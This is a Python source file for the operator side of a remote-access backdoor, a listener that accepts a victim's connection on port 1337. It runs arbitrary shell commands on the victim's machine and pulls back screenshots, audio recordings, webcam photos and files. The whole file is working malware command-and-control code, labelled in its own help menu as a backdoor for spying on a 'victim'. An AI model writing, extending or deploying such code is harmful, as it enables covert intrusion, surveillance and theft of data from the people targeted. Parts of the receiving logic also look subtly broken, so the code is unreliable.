import socket
import argparse
import subprocess
import os
from sys import exit
from termcolor import colored
from datetime import datetime


class Listener():
    def __init__(self, port, host, bufferSize=4096, Separator="<separator>"):
        self.port = port
        self.host = host
        self.bufferSize = bufferSize
        self.Separator = Separator
        self.create_socket()

    def create_socket(self):
        """creates a socket and gets the client connection ! """
        try:
            # Creating the socket object
            self.s = socket.socket()
            # Binding , combining the socket object with ip and port , it takes tuple as input
            self.s.bind((self.host, self.port))
            # let's listen for incoming connections , what is 5 , means we will try for 5 times , means if a error occurs when victim connects to this , then it will listen for 5 faulty connections and will stop listening after that !
            self.s.listen(5)
            print("-"*50)
            print(
                colored(f"[+] Listening on {self.host}:{self.port}", 'green', attrs=['bold']))
            print("-"*50)
            # After connection gets accepted , we  get a tuple with two elemets inside it , element at index 0 is the object through which we will do send commands and recieve output and at the other index , there is tuple with client ip and port !
            # It looks like this
            # (<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 1337), raddr=('127.0.0.1', 39968)>, ('127.0.0.1', 39968))
            self.client_con, self.client_info = self.s.accept()
            print(
                f'\n[+] Recieved a connection from {self.client_info[0]:{self.client_info[1]}}')
            # Sending commands to the host

            self.send_commands()
            self.client_con.close()
            self.s.close()

        except socket.error as err:
            print(
                colored(f"[-] Error occured at socket processing, Reason {err}", 'red'))

    def send_commands(self):
        # before recieving and sending commands,we will accept current workking directory and the username of the victim client to make a terminal look good
        cwd, whoami = self.client_con.recv(
            self.bufferSize).decode().split(self.Separator)
        if os.name == 'nt':
            # for clearing the terminal !
            subprocess.run('cls', shell=True)
        else:
            subprocess.run('clear', shell=True)
        while True:
            try:
                cmd = self.beautify_terminal_take_command(whoami, cwd)
                if len(cmd) > 0:
                    if cmd.lower() == 'quit':
                        self.client_con.send(str.encode(cmd))
                        break
                    elif cmd.lower()=='help':
                        print("Backdoor Supports These Functions ^_^")
                        print(colored("""• screenshot => Takes victim's screenshot\n• record_audio => Records 10 sec voice from victim's device\n• webcam => Takes photo of your victim's device\n•download filename => download files """,'magenta',attrs=['dark']))
                        continue                        
                    else:
                        if cmd.lower()=='screenshot':
                            self.client_con.send(str.encode(cmd))
                            self.recieve_screenshot()
                            results, cwd, whoami = self.client_con.recv(
                            self.bufferSize).decode().split(self.Separator)
                        elif cmd.lower()=='record_audio':
                            self.client_con.send(str.encode(cmd))
                            self.recieve_audio()
                            results, cwd, whoami = self.client_con.recv(
                            self.bufferSize).decode().split(self.Separator)
                        elif cmd.lower()=='webcam_shot':
                            self.client_con.send(str.encode(cmd))
                            self.recieve_webcam_shot()
                            results, cwd, whoami = self.client_con.recv(
                            self.bufferSize).decode().split(self.Separator)
                        elif cmd.lower().split()[0]=='download':
                            self.client_con.send(str.encode(cmd))
                            self.recieve_file()
                            results, cwd, whoami = self.client_con.recv(
                            self.bufferSize).decode().split(self.Separator)
                            
                        else:    
                            self.client_con.send(str.encode(cmd))
                            results,cwd,whoami = self.client_con.recv(
                            self.bufferSize).decode().split(self.Separator)
                            
                        print(colored(results, attrs=['dark']))
                else:
                    # if user gave enter as input then do nothing!
                    continue
            except KeyboardInterrupt:
                # Sending the closing call to the victim !
                self.client_con.send('quit'.encode())
                print("\nGood Bye !")
                # breaking out of the loop
                break
    def recieve_webcam_shot(self):
        bytes,response=self.client_con.recv(self.bufferSize).decode().split(self.Separator)
        bytes=int(bytes)
        if not bytes==0:
            print('\n'+response)
            dir='webcam'
            if not os.path.exists(dir):
                os.mkdir(dir)
            img_name=f"{datetime.now().strftime('%Y-%m-%d-%H:%M:%S')}_webcamShot.png"
            with open(f'{dir}/{img_name}','wb') as img:
                img_data=self.recieve_big_data(bytes)
                img.write(img_data)
            print(colored("\n[+] Webcam shot recieved in webcam folder !",'yellow',attrs=['dark']))
        else:
            print(colored(f"[-]{response}",'red',attrs=['dark']))
    def recieve_audio(self):
        incoming_msg=self.client_con.recv(self.bufferSize).decode()
        print(colored(f"\n{incoming_msg}",'cyan',attrs=['dark']))
        bytes,response=self.client_con.recv(self.bufferSize).decode().split(self.Separator)
        bytes=int(bytes)
        if not bytes==0:
            print('\n'+response)
            dir='Audios'
            if not os.path.exists(dir):
                os.mkdir(dir)
            audio_name=f"{datetime.now().strftime('%Y-%m-%d-%H:%M:%S')}_audio.wav"
            with open(f'{dir}/{audio_name}','wb') as audio:
                audio_data=self.recieve_big_data(bytes)
                audio.write(audio_data)
            print(colored("\n[+] Audio recieved in Audios folder",'yellow',attrs=['dark']))     
        else:
            print(colored(f"[-]{response}",'red',attrs=['dark']))
    def recieve_file(self):
        bytes,response,fileName=self.client_con.recv(self.bufferSize).decode().split(self.Separator)
        bytes=int(bytes)
        if not bytes==0:
            print('\n'+response)
            dir="Victim's Files"
            if not os.path.exists(dir):
                os.mkdir(dir)
            with open(f'{dir}/{fileName}','wb') as f:
                file_data=self.recieve_big_data(bytes)
                f.write(file_data)

            print(colored(f"\n[+] {fileName} saved at {dir} Folder",'yellow',attrs=['dark']))
        else:
            print(colored(f"[-]{response}",'red',attrs=['dark']))
        
    def recieve_screenshot(self):
        bytes,response=self.client_con.recv(self.bufferSize).decode().split(self.Separator)
        bytes=int(bytes)
        if not bytes==0:
            print('\n'+response)
            dir='Screenshots'
            if not os.path.exists(dir):
                os.mkdir(dir)
            img_name=f"{datetime.now().strftime('%Y-%m-%d-%H:%M:%S')}_Screenshot.png"
            with open(f'{dir}/{img_name}','wb') as img:
                img_data=self.recieve_big_data(bytes)
                img.write(img_data)

            print(colored("\n[+] Screen shot recieved in screenshots folder",'yellow',attrs=['dark']))
        else:
            print(colored(f"[-]{response}",'red',attrs=['dark']))

    def beautify_terminal_take_command(self, whoami, cwd):
        """Beautifies the terminal and take commamnds and send to the main function"""
        print(colored(f"👤 {whoami} on ", 'green', attrs=['bold']), end="")
        print(colored(f"📁 [{cwd}]", 'blue', attrs=['dark']), end=" at ⏳ ")
        print(colored(f"[{datetime.now().strftime('%H:%M:%S')}]", 'magenta'))
        print(colored("# ", 'red'), end="")
        cmd = input().strip()
        return cmd
    
    def recieve_big_data(self,buffer):
        bytes_data=b""
        while True:
            bytes_part=self.client_con.recv(buffer)
                
            if len(bytes_part)==buffer:
                return bytes_part
            bytes_data+=bytes_part
                
            if len(bytes_data)==buffer:
                return bytes_data
            
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', help="Port on which listen to ",
                        dest="port", default=1337, required=False, type=int)

    return parser.parse_args()


if __name__ == "__main__":
    arguments = get_args()
    port = arguments.port
    host = "0.0.0.0"
    server = Listener(port, host)
